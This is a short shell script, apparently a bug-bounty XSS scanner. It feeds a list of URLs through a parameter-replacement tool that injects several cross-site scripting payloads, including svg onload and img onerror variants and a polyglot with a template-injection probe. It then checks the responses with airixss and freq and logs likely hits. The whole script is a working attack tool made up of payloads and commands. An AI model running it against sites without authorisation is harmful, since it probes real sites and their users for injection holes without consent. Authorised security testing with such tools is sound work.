final_urls="$1"

cat "$final_urls" | python3 ~/my_tool/prmreplace/prmreplace.py '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" -c 20 -H "$2" | egrep -v 'Not' | tee -a xssPossible.txt

cat "$final_urls" | python3 ~/my_tool/prmreplace/prmreplace.py '%22><svg%20onload=confirm(1);>' | airixss -payload "confirm(1)" -c 20 -H "$2" | tee -a xssPossible.txt

cat "$final_urls" | python3 ~/my_tool/prmreplace/prmreplace.py '\"><svg/onload=alert(1)>*\'"/---+{{7*7}}" | airixss -payload "confirm(1)" -H "$2" -c 20 | tee -a xssPossible.txt

cat "$final_urls" | python3 ~/my_tool/prmreplace/prmreplace.py '\"><svg/onload=alert(1)>*\'"/---+{{7*7}}" | airixss -payload "49" -H "$2" -c 20 | tee -a xssPossible.txt

cat "$final_urls" | python3 ~/my_tool/prmreplace/prmreplace.py '“><img src=x onerror=alert(1)>' | tee -a xss_fuzz.txt
cat xss_fuzz.txt | ~/go/bin/freq | tee -a possible_xss.txt
